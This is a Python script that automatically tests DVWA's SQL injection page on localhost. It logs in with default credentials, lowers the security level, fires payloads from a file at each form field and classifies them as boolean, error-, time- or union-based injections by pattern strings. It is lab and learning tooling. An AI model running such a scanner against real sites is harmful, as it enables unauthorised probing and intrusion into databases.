import requests
import time
import json
from bs4 import BeautifulSoup

# Configuration
login_url = "http://127.0.0.1/DVWA/login.php"
security_url = "http://127.0.0.1/DVWA/security.php"
target_url = "http://127.0.0.1/DVWA/vulnerabilities/sqli/"
source_code_url = "http://127.0.0.1/DVWA/vulnerabilities/view_source.php?id=sqli&security=low"
payloads_file_path = "/home/kali/Desktop/payloads.json"  # Local path to payloads.json file
username = "admin"  # Replace with the correct username
password = "password"  # Replace with the correct password

# Step 1: Fetch Payloads
def fetch_payloads():
    with open(payloads_file_path, 'r') as file:
        payloads = json.load(file)
    return payloads

# Step 2: Log in to the target site
def login(session, url, username, password):
    login_page = session.get(url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    form = soup.find('form')
    data = {}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') == 'username':
            data[input_tag.get('name')] = username
        elif input_tag.get('name') == 'password':
            data[input_tag.get('name')] = password
        elif input_tag.get('name'):
            data[input_tag.get('name')] = input_tag.get('value')
    
    response = session.post(url, data=data)
    return response

# Step 3: Set security level to low
def set_security_level(session, url):
    security_page = session.get(url)
    soup = BeautifulSoup(security_page.content, 'html.parser')
    form = soup.find('form')
    data = {}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('type') != 'submit':
            data[input_tag.get('name')] = input_tag.get('value')
    
    for select_tag in form.find_all('select'):
        data[select_tag.get('name')] = 'low'
    
    # Include the submit button
    for input_tag in form.find_all('input', {'type': 'submit'}):
        data[input_tag.get('name')] = input_tag.get('value')
    
    response = session.post(url, data=data)
    return response

# Step 4: Fetch Form Parameters
def fetch_form_params(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    form = soup.find('form')
    if not form:
        print("No form found on the page.")
        return {}
    inputs = form.find_all('input')
    params = {}
    for input_tag in inputs:
        if input_tag.get('name'):
            params[input_tag.get('name')] = ''
    return params

# Step 5: Test Payloads
def test_payloads(session, payloads, params):
    results = []
    for payload in payloads:
        for param in params.keys():
            original_value = params[param]
            params[param] = payload
            start_time = time.time()
            response = session.get(target_url, params=params)
            response_time = time.time() - start_time
            content = response.content.decode()

            if "You have an error in your SQL syntax" in content or "Warning: mysql_fetch_array()" in content:
                classification = classify_payload(payload)
                results.append((payload, param, classification, "Detected via SQL error message"))
            elif response_time > 5:  # Time-based payload detection
                classification = classify_payload(payload)
                results.append((payload, param, classification, "Detected via response delay"))

            params[param] = original_value
    return results

# Step 6: Classify Payloads
def classify_payload(payload):
    basic_sql_injection_patterns = ["' OR '1'='1", "' OR 1=1", "'--", "'#", "'/*"]
    error_based_patterns = ["CONVERT", "EXTRACTVALUE", "UTL_INADDR"]
    time_based_patterns = ["SLEEP", "BENCHMARK", "WAITFOR DELAY"]
    union_based_patterns = ["UNION SELECT"]

    # Check for Basic SQL Injection
    for pattern in basic_sql_injection_patterns:
        if pattern in payload:
            return "Basic SQL Injection (B)"

    # Check for Error-Based SQL Injection
    for pattern in error_based_patterns:
        if pattern in payload:
            return "Error-Based SQL Injection (E)"

    # Check for Time-Based SQL Injection
    for pattern in time_based_patterns:
        if pattern in payload:
            return "Time-Based SQL Injection (T)"

    # Check for Union-Based SQL Injection
    for pattern in union_based_patterns:
        if pattern in payload:
            return "Union-Based SQL Injection (U)"

    return "Unknown"

# Step 7: Fetch Vulnerable Line
def fetch_vulnerable_line(session, source_url, param):
    response = session.get(source_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    code_lines = soup.find_all('pre')
    for code in code_lines:
        if param in code.text:
            return code.text.strip()
    return "Vulnerable line not found."

# Step 8: Print Results
def print_results(results, session):
    if not results:
        print("No vulnerabilities found.")
        return

    for result in results:
        payload, param, classification, detection_method = result
        vulnerable_line = fetch_vulnerable_line(session, source_code_url, param)
        print(f"Payload: {payload}")
        print(f"Vulnerable Parameter: {param}")
        print(f"Classification: {classification}")
        print(f"Detection Method: {detection_method}")
        print(f"Vulnerable Line: {vulnerable_line}")
        print("-" * 80)

# Main Execution
def main():
    print("Fetching payloads...")
    payloads = fetch_payloads()
    print(f"Fetched payloads.")
    
    with requests.Session() as session:
        print("Logging in...")
        login_response = login(session, login_url, username, password)
        if "Welcome" not in login_response.text:
            print("Login failed.")
            return
        print("Login successful.")

        print("Setting security level to low...")
        security_response = set_security_level(session, security_url)
        if "Security level set to low" not in security_response.text:
            print("Failed to set security level.")
            return
        print("Security level set to low.")

        print("Fetching form parameters...")
        params = fetch_form_params(session, target_url)
        if not params:
            print("No parameters found to test.")
            return
        
        print("Testing payloads...")
        results = test_payloads(session, payloads, params)
        
        print("Printing results...")
        print_results(results, session)

if __name__ == "__main__":
    main()
